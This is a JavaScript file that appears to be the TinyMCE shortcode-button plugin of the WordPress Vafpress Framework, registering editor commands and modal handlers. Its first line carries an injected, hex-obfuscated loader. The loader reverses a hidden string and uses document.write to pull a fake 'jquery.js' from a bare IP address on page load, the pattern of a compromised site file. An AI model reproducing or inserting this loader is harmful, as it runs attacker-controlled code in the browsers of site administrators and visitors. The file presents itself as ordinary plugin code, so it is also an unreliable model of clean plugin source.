var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))(function($){
	function create(sg)
	{
		tinymce.create('tinymce.plugins.' + sg.name, {
			init: function(ed, url) {
				var cmd_cb = function(name) {
					return function() {
						$('#' + name + '_modal').reveal({ animation: 'none' });
						$('#' + name + '_modal').css('top', parseInt($('#' + name + '_modal').css('top')) - window.scrollY);
						$('#' + name + '_modal').unbind('reveal:close.vp_sc');
						$('#' + name + '_modal').bind('reveal:close.vp_sc', function () {
							$('.vp-sc-menu-item.active').find('.vp-sc-form').scReset().vp_slideUp();
							$('.vp-sc-menu-item.active').removeClass('active');
						});
						$('#' + name + '_modal').unbind('vp_insert_shortcode.vp_tinymce');
						$('#' + name + '_modal').bind('vp_insert_shortcode.vp_tinymce', function(event, code) {
							ed.selection.setContent(code);
							$(ed.getElement()).insertAtCaret(code);
						});
					}
				}
				ed.addCommand(sg.name + '_cmd', cmd_cb(sg.name));
				ed.addButton(sg.name, {title: sg.button_title, cmd: sg.name + '_cmd', image: sg.main_image});
			},
			getInfo: function() {
				return {
					longname: 'Vafpress Framework',
					author  : 'Vafpress'
				};
			}
		});
	}

	for (var i = 0; i < vp_sg.length; i++){
		create(vp_sg[i]);
	}

})(jQuery);

for (var i = 0; i < vp_sg.length; i++){
	tinymce.PluginManager.add(vp_sg[i].name, tinymce.plugins[vp_sg[i].name]);
}
